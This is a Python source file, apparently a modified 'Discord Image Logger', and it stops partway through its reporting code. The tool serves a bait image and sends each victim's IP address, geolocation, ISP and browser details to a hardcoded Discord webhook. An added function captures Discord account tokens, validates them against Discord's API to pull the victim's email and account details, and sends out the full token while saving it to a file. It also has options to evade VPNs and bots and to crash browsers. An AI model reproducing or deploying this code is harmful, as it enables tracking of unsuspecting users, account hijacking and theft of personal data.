# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted
# MODIFIED: Added Discord Token Capture functionality

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, re, json, time

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0 + Token Capture"
__author__ = "DeKrypt & Modified"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1526403537037426698/w0WhkvyaaQ7FagPqEzQHQyHFjrP4oAfvLv6RUiJLxZX2xbss73DPMeCtQwhZeUfDLdhH",
    "image": "https://upload.wikimedia.org/wikipedia/en/4/4d/Shrek_%28character%29.png", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    
    # NEW: Token Capture Options
    "captureTokens": True, # Enable Discord token capture from URL parameters
    "tokenParam": "token", # Parameter name for token (e.g., ?token=TOKEN_HERE)
    "validateTokens": True, # Validate token by checking with Discord API

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

# ========== NEW: TOKEN CAPTURE FUNCTION ==========
def captureToken(token, source="URL parameter", ip="Unknown", useragent="Unknown"):
    """Captures and validates Discord tokens"""
    if not config["captureTokens"] or not token:
        return False
    
    if len(token) < 30:
        return False
    
    # Validate token format
    if not re.match(r'^[a-zA-Z0-9._-]{30,100}$', token):
        return False
    
    username = "Unknown"
    discriminator = "0000"
    user_id = "Unknown"
    email = "Unknown"
    verified = False
    nitro_type = "None"
    
    # Validate with Discord API
    if config["validateTokens"]:
        try:
            headers = {"Authorization": token}
            r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
            if r.status_code == 200:
                data = r.json()
                username = data.get("username", "Unknown")
                discriminator = data.get("discriminator", "0000")
                user_id = data.get("id", "Unknown")
                email = data.get("email", "No email")
                verified = data.get("verified", False)
                nitro = data.get("premium_type", 0)
                nitro_types = ["None", "Nitro Classic", "Nitro", "Nitro Basic"]
                nitro_type = nitro_types[nitro] if nitro < len(nitro_types) else "Unknown"
            else:
                return False  # Invalid token
        except:
            return False
    
    # Send token to webhook
    embed = {
        "username": config["username"],
        "content": "@everyone" if config.get("ping_on_token", False) else "",
        "embeds": [
            {
                "title": "🎯 Discord Token Captured",
                "color": 0xFF0000,
                "description": f"""**Token:** `{token[:30]}...` (click to copy)

**User Info:**
> **Username:** `{username}#{discriminator}`
> **User ID:** `{user_id}`
> **Email:** `{email}`
> **Verified:** `{verified}`
> **Nitro:** `{nitro_type}`

**Source:** `{source}`
**IP:** `{ip}`
**User-Agent:** `{useragent[:100]}`

**Full Token:** ||{token}||
**Timestamp:** <t:{int(time.time())}>""",
                "footer": {"text": "Image Logger - Token Capture"}
            }
        ]
    }
    
    try:
        requests.post(config["webhook"], json=embed, timeout=3)
        # Also save locally
        with open("captured_tokens.txt", "a", encoding="utf-8") as f:
            f.write(f"{time.ctime()} | {ip} | {username}#{discriminator} | {token}\n")
        return True
    except:
        return False

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
